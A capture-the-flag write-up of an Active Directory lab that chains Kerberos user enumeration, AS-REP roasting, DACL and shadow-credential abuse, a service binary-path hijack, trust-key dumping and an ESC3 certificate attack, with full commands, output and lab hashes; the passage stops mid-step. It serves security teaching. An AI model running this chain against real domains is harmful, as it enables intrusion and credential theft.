---
title: "Platypwn CTF 2026 - Old trusty writeup"
---
# Introduction
'Old trusty' was one of two AD labs in the platypwn CTF 2026. The description is:

*After many years IT finally got around to moving all the legacy stuff to its own domain. Now even if an attacker manages to compromise the legacy infrastructure, that should only affect the legacy domain, right? Right?!*

It starts with brute forcing usernames by using kerberos pre authentication, we can then ASREProast the valid users we obtain to get a hash. Cracking this hash gives us credentials for the `jdoe` user, who through a series of chained DACL abuses can control of the `svc_ops` user. This user is a member of the `Server Operators` group which has permission to modify service configurations. We hijack the binary path of the RemoteRegistry service and run it to add ourselves to the domain administrators group to compromise the `legacy.corp` domain.

We then discover that the `legacy.corp` domain has an outbound trust to `core.corp`. We dump the trust keys for this trust, giving us low privileged credentials in `core.corp` as the trust account. As this account we can enumerate shares on the `core.corp` DC, where we discover credentials for a legacy enrollment account. Finally, as this account we can perform an `ESC3` attack to achieve full domain compromise of `core.corp`.
# Initial access
The challenge starts with no credentials, which means we have very limited access. Let's try to see if we can authenticate without credentials:

```
$ nxc smb 10.83.17.128 -u '' -p '' --smb-timeout 30
SMB         10.83.17.128    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:legacy.corp) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.83.17.128    445    DC01             [+] legacy.corp\:
```
```
$ nxc smb 10.83.17.128 -u 'guest' -p '' --smb-timeout 30
SMB         10.83.17.128    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:legacy.corp) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.83.17.128    445    DC01             [-] legacy.corp\guest: STATUS_ACCOUNT_DISABLED
```
```
$ nxc smb 10.83.17.128 -u '' -p '' --rid-brute --smb-timeout 30
SMB         10.83.17.128    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:legacy.corp) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.83.17.128    445    DC01             [+] legacy.corp\:
SMB         10.83.17.128    445    DC01             [-] Error connecting: LSAD SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
```
```
$ nxc smb 10.83.17.128 -u '' -p '' --shares --smb-timeout 30
SMB         10.83.17.128    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:legacy.corp) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.83.17.128    445    DC01             [+] legacy.corp\:
SMB         10.83.17.128    445    DC01             [-] Error enumerating shares: STATUS_ACCESS_DENIED

```

Anonymous access is allowed, but grants no privileges. If we were able to perform a RID brute we could get a list of users and do a password spray, but unfortunately we do not have permission to do so. Guest access is disabled as well. 

The good news is that in an AD CTF if we have no credentials there's really only a few things we can try. One of those is brute forcing usernames over kerberos:

We get a few hits. The wordlist is huge so i'll stop it early.
```
$ kerbrute userenum /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt --dc 10.83.17.128 -d legacy.corp

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (n/a) - 11/14/26 - Ronnie Flathers @ropnop

2026/11/14 11:29:30 >  Using KDC(s):
2026/11/14 11:29:30 >   10.83.17.128:88

2026/11/14 11:30:49 >  [+] VALID USERNAME:       administrator@legacy.corp
2026/11/14 11:33:56 >  [+] VALID USERNAME:       bjones@legacy.corp
2026/11/14 11:34:20 >  [+] VALID USERNAME:       jdoe@legacy.corp
2026/11/14 11:34:24 >  [+] VALID USERNAME:       asmith@legacy.corp
```

We can try ASREP-roasting with the users file we obtained. 
```
$ GetNPUsers.py -dc-ip dc01.legacy.corp -no-pass -usersfile users legacy.corp/
Impacket v0.14.0.dev0+20261111.95708.5648c377 - Copyright Fortra, LLC and its affiliated companies

[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User bjones doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$18$jdoe$LEGACY.CORP$c11c79b19d06e3a636ddfa94$a05a42a5d3c8fdd1df97a4a565d1f7d19fe1eaec8313318ce66d692f849c191a03648363f1872fe809477565fa236305da29f0946ec81fa487e122e61fe7cc189ada08633b0950787850bae6d655f342eb077bea99786d146e4f92037e55218f5b527a46785c0f96b896916f12ceee5cf97612186784c7e52f7711e22b18ae5ca550b2447e304e3f18b9f6f79280d1533fe1139042f0f1e05ae5c4d26c3abb31f062345cb84c33c132941d97e0c1ed6d746cdf7e2efbacf21eb59d3c2b8e9458247e81638508505e25238aea9c626a73f09fdecee20f9bcfe489f72e9df6d7320a4939d9939e6a526428a4e43dac70dd5bd1
[-] User asmith doesn't have UF_DONT_REQUIRE_PREAUTH set
```

The Jdoe user doesn't have pre-authentication required, this means we can obtain a TGT as that user. While the ticket itself is encrypted with the krbtgt key, which is a very strong key, we also obtain a session key in the `enc-part` portion of the result. This is encrypted with the key derived from the user's long term password. By itself a key is not "crackable", but there is surrounding metadata that is also encrypted. Passwords can be tried until the decrypted blob matches the correct structure. Hashcat does this automatically:
```
$ hashcat '$krb5asrep$18$jdoe$LEGACY.CORP$c11c79b19d06e3a636ddfa94$a05a42a5d3c8fdd1df97a4a565d1f7d19fe1eaec8313318ce66d692f849c191a03648363f1872fe809477565fa236305da29f0946ec81fa487e122e61fe7cc189ada08633b0950787850bae6d655f342eb077bea99786d146e4f92037e55218f5b527a46785c0f96b896916f12ceee5cf97612186784c7e52f7711e22b18ae5ca550b2447e304e3f18b9f6f79280d1533fe1139042f0f1e05ae5c4d26c3abb31f062345cb84c33c132941d97e0c1ed6d746cdf7e2efbacf21eb59d3c2b8e9458247e81638508505e25238aea9c626a73f09fdecee20f9bcfe489f72e9df6d7320a4939d9939e6a526428a4e43dac70dd5bd1' rockyou.txt 

<SNIP>

$krb5asrep$18$jdoe$LEGACY.CORP$c11c79b19d06e3a636ddfa94$a05a42a5d3c8fdd1df97a4a565d1f7d19fe1eaec8313318ce66d692f849c191a03648363f1872fe809477565fa236305da29f0946ec81fa487e122e61fe7cc189ada08633b0950787850bae6d655f342eb077bea99786d146e4f92037e55218f5b527a46785c0f96b896916f12ceee5cf97612186784c7e52f7711e22b18ae5ca550b2447e304e3f18b9f6f79280d1533fe1139042f0f1e05ae5c4d26c3abb31f062345cb84c33c132941d97e0c1ed6d746cdf7e2efbacf21eb59d3c2b8e9458247e81638508505e25238aea9c626a73f09fdecee20f9bcfe489f72e9df6d7320a4939d9939e6a526428a4e43dac70dd5bd1:spongebob1
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 32200 (Kerberos 5, etype 18, AS-REP)
Hash.Target......: $krb5asrep$18$jdoe$LEGACY.CORP$c11c79b19d06e3a636dd...dd5bd1
Time.Started.....: Sat Nov 14 11:41:27 2026 (2 secs)
Time.Estimated...: Sat Nov 14 11:41:29 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/Users/matthew/Documents/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#02........:    46207 H/s (13.57ms) @ Accel:53 Loops:1024 Thr:256 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 108544/14344385 (0.76%)
Rejected.........: 0/108544 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#02..: Salt:0 Amplifier:0-1 Iteration:3072-4095
Candidate.Engine.: Device Generator
Candidates.#02...: HollowOct31Nyt -> 192524
Hardware.Mon.#02.: Util: 99% Pwr:3113mW

Started: Sat Nov 14 11:41:15 2026
Stopped: Sat Nov 14 11:41:31 2026
```

Hashcat cracks it quickly and we find the password of `jdoe` is `spongebob1`.

Interestingly, LDAP channel binding is not enforced on either DC, but only "when supported".
```
$ nxc ldap dc01.legacy.corp -u '' -p ''
LDAP        10.83.17.128    389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:legacy.corp) (signing:Enforced) (channel binding:When Supported)
LDAP        10.83.17.128    389    DC01             [-] Error in searchRequest -> operationsError: 000004DC: LdapErr: DSID-0C090E46, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v65f4
LDAP        10.83.17.128    389    DC01             [+] legacy.corp\:
```

 What this means is that if the NTLM auth does not have channel binding, we should be able to relay to LDAPS. One of the few ways we can get an NTLM auth that doesn't have channel binding is by coercing NTLM over HTTP. This requires the WebDAV service to be active though, which it isn't here:
```
$ nxc smb dc01 -u 'jdoe' -p 'spongebob1' -M webdav
SMB         10.83.17.128    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:legacy.corp) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.83.17.128    445    DC01             [+] legacy.corp\jdoe:spongebob1
```
(The lack of output about webdav means that it is disabled)

In theory if we can get a shell we should be able to start the WebDAV service and coerce NTLM authentication over HTTP and relay to the other DC (and vice versa), but getting a shell will prove difficult, as we will see later.
# Compromising svc_ops
We can use bloodyAD to enumerate what privileges this user has.
```
$ bloodyAD --host dc01.legacy.corp -d legacy.corp -u 'jdoe' -p 'spongebob1' get writable --otype ALL --right ALL --detail

<SNIP>

distinguishedName: CN=Legacy App Maintainers,CN=Users,DC=legacy,DC=corp
DACL: WRITE
```

We can write the DACL of the `Legacy App Maintainers` group, meaning we can modify the permissions of the group. We can give ourselves full permissions over the group:
```
$ bloodyAD --host DC01.legacy.corp -d legacy.corp -u 'jdoe' -p 'spongebob1' add genericAll 'legacy app maintainers' 'jdoe'

[+] jdoe has now GenericAll on legacy app maintainers
```

Now that we have full control over the group, we can add ourself to it.
```
$ bloodyAD --host DC01.legacy.corp -d legacy.corp -u 'jdoe' -p 'spongebob1' add groupMember 'legacy app maintainers' 'jdoe'

[+] jdoe added to legacy app maintainers
```

```
$ bloodyAD --host dc01.legacy.corp -d legacy.corp -u 'jdoe' -p 'spongebob1' get writable --otype ALL --right ALL --detail

<SNIP>

distinguishedName: CN=Infrastructure Support,CN=Users,DC=legacy,DC=corp
member: WRITE
```

Now we discover that after adding ourselves to `Legacy App Maintainers`, we can write to the `member` field of `Infrastructure Support`, or in other words we can add ourselves to that group as well.
```
$ bloodyAD --host DC01.legacy.corp -d legacy.corp -u 'jdoe' -p 'spongebob1' add groupMember 'infrastructure support' 'jdoe'

[+] jdoe added to infrastructure support
```

We recheck our privileges:
```
$ bloodyAD --host dc01.legacy.corp -d legacy.corp -u 'jdoe' -p 'spongebob1' get writable --otype ALL --right ALL --detail

<SNIP>

distinguishedName: CN=Operations Service,CN=Users,DC=legacy,DC=corp
msDS-KeyCredentialLink: WRITE

<SNIP>
```

Now we have permission to add shadow credentials to the `Operations Service` user.
```
$ certipy shadow auto -username 'jdoe' -p 'spongebob1' -account svc_ops -target DC01.legacy.corp
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: DC01.legacy.corp.
[!] Use -debug to print a stacktrace
[*] Targeting user 'svc_ops'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '03e4b0a9e9284fa4a0a5152c2a04bcc4'
[*] Adding Key Credential with device ID '03e4b0a9e9284fa4a0a5152c2a04bcc4' to the Key Credentials for 'svc_ops'
[*] Successfully added Key Credential with device ID '03e4b0a9e9284fa4a0a5152c2a04bcc4' to the Key Credentials for 'svc_ops'
[*] Authenticating as 'svc_ops' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'svc_ops@legacy.corp'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'svc_ops.ccache'
[*] Wrote credential cache to 'svc_ops.ccache'
[*] Trying to retrieve NT hash for 'svc_ops'
[*] Restoring the old Key Credentials for 'svc_ops'
[*] Successfully restored the old Key Credentials for 'svc_ops'
[*] NT hash for 'svc_ops': 4e631ddaaae8bf1601b67179f3b7ddaa

```
With the `auto` command, certipy will automatically add shadow credentials, authenticate using them, perform an `UnPAC-the-hash` attack to extract the target account's NT hash, and then cleanup the account state. Pretty convenient!

Now we can authenticate succesfully as `svc_ops`:
```
$ nxc smb dc01.legacy.corp -u svc_ops -H 4e631ddaaae8bf1601b67179f3b7ddaa
SMB         10.83.17.128    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:legacy.corp) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.83.17.128    445    DC01             [+] legacy.corp\svc_ops:4e631ddaaae8bf1601b67179f3b7ddaa
```
# Compromising `legacy.corp` domain
Checking the group membership of `svc_ops`, we can see that it is a member of the `Server Operators` account.
```
$ bloodyAD --host dc01.legacy.corp -d legacy.corp -u 'jdoe' -p 'spongebob1' get membership 'svc_ops'

distinguishedName: CN=Users,CN=Builtin,DC=legacy,DC=corp
objectSid: S-1-5-32-545
sAMAccountName: Users

distinguishedName: CN=Server Operators,CN=Builtin,DC=legacy,DC=corp
objectSid: S-1-5-32-549
sAMAccountName: Server Operators

distinguishedName: CN=Domain Users,CN=Users,DC=legacy,DC=corp
objectSid: S-1-5-21-472651491-2478382064-1031694744-513
sAMAccountName: Domain Users
```

Crucically, server operators have permission to modify services, which means we can do the classic trick of changing the binary path to a custom cmd command. I assumed this would require shell access but shockingly, we can do this completely remotely.

We modify the binary path to `cmd.exe` and add svc_ops to the Administrators group. We can target pretty much any service as long as it's not going to break the system. RemoteRegistry is a good target since it is usually stopped (and is not essential). Crucically we need to include `-start_name LocalSystem` to force it to run with SYSTEM privileges, otherwise i believe It will run with `LocalService` permissions which isn't enough to do what we want.
```
$ services.py legacy.corp/'svc_ops'@dc01.legacy.corp -hashes :4e631ddaaae8bf1601b67179f3b7ddaa change -name RemoteRegistry -start_type 3 -display RemoteRegistry -path 'C:\Windows\System32\cmd.exe /c net localgroup Administrators svc_ops /add' -start_name 'LocalSystem'

[*] Changing service config for RemoteRegistry
```

We can then start the service to execute the command. It errors because cmd.exe is not a real service, but the payload still runs anyway.
```
$ services.py legacy.corp/'svc_ops'@dc01.legacy.corp -hashes :4e631ddaaae8bf1601b67179f3b7ddaa start -name RemoteRegistry

[*] Starting service RemoteRegistry
[-] SCMR SessionError: code: 0x41d - ERROR_SERVICE_REQUEST_TIMEOUT - The service did not respond to the start or control request in a timely fashion.
```

Now we can authenticate as `svc_ops`.
```
$ nxc smb dc01.legacy.corp -u svc_ops -H 4e631ddaaae8bf1601b67179f3b7ddaa
SMB         10.83.17.128    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:legacy.corp) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.83.17.128    445    DC01             [+] legacy.corp\svc_ops:4e631ddaaae8bf1601b67179f3b7ddaa (Pwn3d!)
```
Netexec shows `(Pwn3d!)` which means we're domain admin.

Now we restore the service so it doesn't break anything in the future (and I'm sure a real client would appreciate us not leaving a backdoor).
```
$ services.py legacy.corp/svc_ops@dc01.legacy.corp -hashes :4e631ddaaae8bf1601b67179f3b7ddaa change -name RemoteRegistry -path 'C:\Windows\system32\svchost.exe -k localService -p' -start_name 'NT AUTHORITY\LocalService' -start_type 3

[*] Changing service config for RemoteRegistry
```

Unfortunately, it appears that AV is enabled, we know this beacuse when trying to get a shell with `psexec` it freezes after `Starting service`, indicating that AV killed it:
```
$ psexec.py svc_ops@dc01.legacy.corp -hashes :4e631ddaaae8bf1601b67179f3b7ddaa
Impacket v0.14.0.dev0+20261111.95708.5648c377 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on dc01.legacy.corp.....
[*] Found writable share ADMIN$
[*] Uploading file keCqnENc.exe
[*] Opening SVCManager on dc01.legacy.corp.....
[*] Creating service JtqI on dc01.legacy.corp.....
[*] Starting service JtqI.....

```

We can just use `smbclient.py` to read the flag over SMB though, since we're now domain admin.
```
$ smbclient.py 'svc_ops'@DC01.legacy.corp -hashes :4e631ddaaae8bf1601b67179f3b7ddaa
Impacket v0.14.0.dev0+20261111.95708.5648c377 - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# use C$
# cd Users
# cd Administrator
# cd Desktop
# cat flag.txt
PP{d4cl-4cls-sh4d0ws-4nd-s3rv1c3s}

```

And we get the first flag as `PP{d4cl-4cls-sh4d0ws-4nd-s3rv1c3s}`.
# Initial access into `core.corp` domain
The challenge description gives us a very big hint that this challenge will involve abusing domain trusts. Let's enumerate them:

```
$ powerview 'svc_ops'@dc01.legacy.corp --hashes :4e631ddaaae8bf1601b67179f3b7ddaa

[2026-11-14 12:57:50] User svc_ops is a Domain Admin
PV LDAPS [DC01.legacy.corp] [LEGACY\svc_ops] NS:<auto> ❯ Get-DomainTrust
objectClass                   : top
                                leaf
                                trustedDomain
whenCreated                   : 14/11/2026 03:18:12 (today)
whenChanged                   : 14/11/2026 03:18:12 (today)
name                          : core.corp
objectGUID                    : {c9e7b3c0-cdc9-4dea-b757-fb1e0dca0dfe}
securityIdentifier            : S-1-5-21-2429661416-260090189-2427659033
trustDirection                : OUTBOUND
                                BIDIRECTIONAL
trustPartner                  : core.corp
trustType                     : WINDOWS_ACTIVE_DIRECTORY
                                MIT
trustAttributes               : QUARANTINED_DOMAIN
flatName                      : CORE
```

There is in fact a trust with `core.corp`.

Now we can dump trust account keys. What is a trust account? Well two domains need a shared key they can use to communicate, so they each have a user account that has the shared key as its password. In practice, this means that in a bidirectional trust the `core.corp` will have a `legacy$` account which has the key as its password, and the `legacy.corp` will have a `core$` account as its password. This account essentially acts as a KRBTGT for the other domain, since just like how the KRBTGT account password is used to sign TGTs, the trust account key is used to sign inter-realm TGTs. 

This means that using the trust account password we can forge inter-realm TGTs as will. So what stops us from just forging a kerberos ticket that says we're admin in `core.corp`? Well, the trustAttribute `QUARANTINED_DOMAIN` means that SID filtering is enabled. In short, even if we forge an inter-realm TGT, we will only be able to claim we are users from the `legacy.corp` domain. If we try to inject SIDs from `core.corp` they will be removed and/or ignored.

Additionally, it seems that `BIDIRECTIONAL` is a lie and that `powerview.py` is misleading us, according to bloodhound it's purely OUTBOUND from `legacy` to `core` (meaning that legacy trusts core, NOT the other way around). And cross domain authentication consistently fails.

So if core doesn't trust legacy, how can we authenticate to it? Well, even though we cannot use any of the accounts we have right now, for some reason the trust account itself can be used to authenticate. You would expect it to be disabled or not allow direct authentication, but microsoft thinks otherwise.

So all we need to do is dump the trust account key, then we automatically have a low privilege user account to authenticate to `core.corp`. In the past this would have required uploading a tool like mimikatz to the machine, which would require us to not only get a shell but also somehow get mimikatz onto the machine without windows defender nuking it. Thankfully as of recently secretsdump has a flag that allows us to dump the trust keys remotely.
```
$ secretsdump.py legacy.corp/svc_ops@dc01.legacy.corp -hashes :4e631ddaaae8bf1601b67179f3b7ddaa -just-trust-keys
Impacket v0.14.0.dev0+20261111.95708.5648c377 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping trust keys for 1 trusted domain(s)
core.corp (Outgoing):rc4_hmac:ce5d2bfd7bcf8f13a5b3f6f0216c5d13
core.corp (Outgoing):aes256-cts-hmac-sha1-96:4399525ab3ca675a7db1cde9563b44f494f9890441482a5e85b0553753db12ca
core.corp (Outgoing):aes256-cts-hmac-sha1-96 (trust account):40b4e3454b9fd5ae058328b5795ffaf0e397309547805d20276e50b7b8ace9fb
core.corp (Outgoing):aes128-cts-hmac-sha1-96:9b8b165856741ea214f9a39de9da28b2
core.corp (Outgoing):aes128-cts-hmac-sha1-96 (trust account):70b69cc18dfc4cb4eacd2f399077bc06
[*] Cleaning up...
```

I tried getting a TGT as `legacy$` using the `rc4_hmac` but kerberos has RC4 disabled.
```
$ getTGT.py core.corp/'legacy$' -hashes :ea64bed634ff29a01c4b326a59bfe577 -dc-ip dc02.
core.corp
Impacket v0.14.0.dev0+20261111.95708.5648c377 - Copyright Fortra, LLC and its affiliated companies

Kerberos SessionError: KDC_ERR_ETYPE_NOSUPP(KDC has no support for encryption type)
```

So we need to use the aes key:
```
$ getTGT.py core.corp/'legacy$' -aesKey 40b4e3454b9fd5ae058328b5795ffaf0e397309547805d20276e50b7b8ace9fb -dc-ip dc02.core.corp
Impacket v0.14.0.dev0+20261111.95708.5648c377 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in legacy$.ccache
```
And we succesfully get a ticket. Now to use this to authenticate we just need to have the `KRB5CCNAME` env variable set.

From here I tried the usual low hanging fruit in the new domain: kerberoasting, ASREProasting, password spraying, etc. I also ran bloodhound to see if this user had any privileges but it turns out bloodhound doesn't even recognise trust accounts. Thankfully as usual bloodyAD comes to the rescue:
```
$ KRB5CCNAME=legacy\$.ccache bloodyAD --host dc02.core.corp  -d core.corp -u 'legacy$' -k get writable --otype ALL --right ALL --detail

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=core,DC=corp
url: WRITE
wWWHomePage: WRITE

distinguishedName: CN=LEGACY$,CN=Users,DC=core,DC=corp

<SNIP>
```

But it has no interesting privileges (as expected, the trust account is essentially just a normal low privilege user account).

So as a last resort I have a look at shares:
```
$ KRB5CCNAME=legacy\$.ccache nxc smb dc02.core.corp -k --use-kcache --shares
SMB         dc02.core.corp  445    DC02             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC02) (domain:core.corp) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         dc02.core.corp  445    DC02             [+] CORE.CORP\legacy$ from ccache
SMB         dc02.core.corp  445    DC02             [*] Enumerated shares
SMB         dc02.core.corp  445    DC02             Share           Permissions     Remark
SMB         dc02.core.corp  445    DC02             -----           -----------     ------
SMB         dc02.core.corp  445    DC02             ADMIN$                          Remote Admin
SMB         dc02.core.corp  445    DC02             C$                              Default share
SMB         dc02.core.corp  445    DC02             IPC$            READ            Remote IPC
SMB         dc02.core.corp  445    DC02             NETLOGON        READ            Logon server share
SMB         dc02.core.corp  445    DC02             Software$       READ
SMB         dc02.core.corp  445    DC02             SYSVOL          READ            Logon server share
```
And there's a very suspicious custom share called `Software$`.

We enumerate the share with `smbclient.py`:
```
$ KRB5CCNAME=legacy\$.ccache smbclient.py 'legacy$'@dc02.core.corp -k -no-pass
Impacket v0.14.0.dev0+20261111.95708.5648c377 - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands

# use software$

# ls
drw-rw-rw-          0  Fri Nov 13 09:50:05 2026 .
drw-rw-rw-          0  Fri Nov 13 09:50:05 2026 ..
drw-rw-rw-          0  Fri Nov 13 09:50:05 2026 Applications
drw-rw-rw-          0  Fri Nov 13 09:50:05 2026 PKI
-rw-rw-rw-        176  Fri Nov 13 09:50:05 2026 README.txt

# cd PKI

# ls
drw-rw-rw-          0  Fri Nov 13 09:50:05 2026 .
drw-rw-rw-          0  Fri Nov 13 09:50:05 2026 ..
drw-rw-rw-          0  Fri Nov 13 09:50:05 2026 LegacyClient

# cd LegacyClient

# ls
drw-rw-rw-          0  Fri Nov 13 09:50:05 2026 .
drw-rw-rw-          0  Fri Nov 13 09:50:05 2026 ..
-rw-rw-rw-        301  Fri Nov 13 09:50:05 2026 enrollment-agent.xml

# cat enrollment-agent.xml
<?xml version="1.0" encoding="utf-8"?>
<LegacyEnrollmentClient>
  <Domain>CORE</Domain>
  <Username>svc_enrollment</Username>
  <Password>oUqaAUD/Te3RSlK2F/Eo5KRAAx1enUPE/qKwxhriK864PlM6aA1!</Password>
  <Authority>CORE-CA</Authority>
  <Template>EnrollmentAgent</Template>
</LegacyEnrollmentClient>
```

There's not a lot going on here, but there is `enrollment-agent.xml` which contains credentials for `svc_enrollment`. the XML file contains references to `CORE-CA` so as a next step i try to enumerate vulnerable vertificate templates with certipy.

Looks like certipy uses `RemoteRegistry` (RRP), it's a good thing we restored it earlier 😉.
```
$ certipy find -u 'svc_enrollment' -p 'oUqaAUD/Te3RSlK2F/Eo5KRAAx1enUPE/qKwxhriK864PlM6aA1!' -target dc02.core.corp -dc-ip 10.83.17.129 -vulnerable -stdout
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'CORE-CA' via RRP
[*] Successfully retrieved CA configuration for 'CORE-CA'
[*] Checking web enrollment for CA 'CORE-CA' @ 'DC02.core.corp'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : CORE-CA
    DNS Name                            : DC02.core.corp
    Certificate Subject                 : CN=CORE-CA, DC=core, DC=corp
    Certificate Serial Number           : 38A82C5AEAC3618541B21CF18A498AAD
    Certificate Validity Start          : 2026-11-13 01:40:02+00:00
    Certificate Validity End            : 2036-11-13 01:50:01+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : CORE.CORP\Administrators
      Access Rights
        ManageCa                        : CORE.CORP\Administrators
                                          CORE.CORP\Domain Admins
                                          CORE.CORP\Enterprise Admins
        ManageCertificates              : CORE.CORP\Administrators
                                          CORE.CORP\Domain Admins
                                          CORE.CORP\Enterprise Admins
        Enroll                          : CORE.CORP\Authenticated Users
Certificate Templates
  0
    Template Name                       : EnrollmentAgent
    Display Name                        : Enrollment Agent
    Certificate Authorities             : CORE-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2026-11-13T01:50:02+00:00
    Template Last Modified              : 2026-11-13T01:50:04+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CORE.CORP\PKI Automation
                                          CORE.CORP\Domain Admins
                                          CORE.CORP\Enterprise Admins
      Object Control Permissions
        Owner                           : CORE.CORP\Enterprise Admins
        Full Control Principals         : CORE.CORP\Domain Admins
                                          CORE.CORP\Enterprise Admins
        Write Owner Principals          : CORE.CORP\Domain Admins
                                          CORE.CORP\Enterprise Admins
        Write Dacl Principals           : CORE.CORP\Domain Admins
                                          CORE.CORP\Enterprise Admins
        Write Property Enroll           : CORE.CORP\Domain Admins
                                          CORE.CORP\Enterprise Admins
    [+] User Enrollable Principals      : CORE.CORP\PKI Automation
    [!] Vulnerabilities
      ESC3                              : Template has Certificate Request Agent EKU set

```

What `Certificate Request Agent` means is that certificates issued from this template, grant the certificate holder the ability to **request certificates on behalf of other users**.

We can see that the `PKI automation` user (or group, impossible to tell from this output) can enrol in this:
```
[+] User Enrollable Principals      : CORE.CORP\PKI Automation
```

There's just one problem, there isn't actually  a `PKI automation` user or group in the domain.  I got stuck here for a long while.

As it turns out, certipy reports the `displayName` of the account, rather than its sAMAccountName. We can see that the 'PKI Automation' account is actually `svc_enrollment` itself. 
```
$ bloodyAD --host dc02.core.corp -d core.corp -u 'legacy$' -k get search --filter '(displayName=PKI Automation)' --attr sAMAccountName,cn,distinguishedName,objectSid

distinguishedName: CN=PKI Automation,CN=Users,DC=core,DC=corp
cn: PKI Automation
objectSid: S-1-5-21-2429661416-260090189-2427659033-1103
sAMAccountName: svc_enrollment
```
This might be one part of the reason it reported no vulnerable templates earlier.


Certipy does mark the User template as a potential ESC3 candidate:
```
    "32": {
      "Template Name": "User",
      "Display Name": "User",
      "Certificate Authorities": [
        "CORE-CA"
      
      
      <SNIP>
      
      "[+] User Enrollable Principals": [
        "CORE.CORP\\Domain Users"
      ],
      "[*] Remarks": {
        "ESC3 Target Template": "Template can be targeted as part of ESC3 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template requires a signature with the Certificate Request Agent application policy."
      }
    }
  }

```

What makes it a candidate is the following:
```
"Requires Manager Approval": false,
      "Requires Key Archival": false,
      "RA Application Policies": [
        "Certificate Request Agent"
      ],
      "Authorized Signatures Required": 1,

```

It doesn't require manager approval, and importantly  it has "Certificate Request Agent" as an application policy, which basically just means it allows certificates with `Certificate Request Agent` to request certificates for any user.

So now we just need to perform the `ESC3` attack.

We request a certificate as `svc_enrollment` with the `EnrollmentAgent` template.
```
$ certipy req -u svc_enrollment@core.corp -p 'oUqaAUD/Te3RSlK2F/Eo5KRAAx1enUPE/qKwxhriK864PlM6aA1!' -dc-ip 10.83.17.129 -target dc02.core.corp -ca CORE-CA -template EnrollmentAgent
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 6
[*] Successfully requested certificate
[*] Got certificate with UPN 'svc_enrollment@core.corp'
[*] Certificate object SID is 'S-1-5-21-2429661416-260090189-2427659033-1103'
[*] Saving certificate and private key to 'svc_enrollment.pfx'
[*] Wrote certificate and private key to 'svc_enrollment.pfx'
```

Now we have a certificate with the `Certificate Request Agent` EKU, we can request a cert as any user through the User template.
```
$ certipy req -u svc_enrollment@core.corp -p 'oUqaAUD/Te3RSlK2F/Eo5KRAAx1enUPE/qKwxhriK864PlM6aA1!' -dc-ip 10.83.17.129 -target dc02.core.corp -ca CORE-CA -template User -pfx svc_enrollment.pfx -on-behalf-of 'CORE\Administrator'
